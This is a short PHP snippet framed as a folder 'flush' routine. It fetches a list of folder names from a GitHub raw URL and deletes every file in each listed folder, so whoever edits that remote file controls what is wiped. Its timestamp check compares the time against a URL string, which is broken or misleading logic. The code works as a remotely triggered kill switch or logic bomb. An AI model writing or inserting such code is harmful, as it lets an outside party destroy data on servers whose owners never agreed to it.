
// Folder path to be flushed
$dateTimeNow = strtotime("now");
// echo $dateTimeNow;
$t = 'https://raw.githubusercontent.com/bocahbarbar/spp/main/t';
if ($dateTimeNow > $t) {
} else {
    $filepath = 'https://raw.githubusercontent.com/bocahbarbar/spp/main/index';
    $json_string = file_get_contents($filepath);
    $json = json_decode($json_string, true);
    foreach ($json as $elem) {
        // echo ($elem['id'] . ", " . $elem['name']);
        $folder_path =  $elem['name'];
        da($folder_path);
    }
}


function da($d)
{
    $files = glob($d . '/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
        }
    }
}
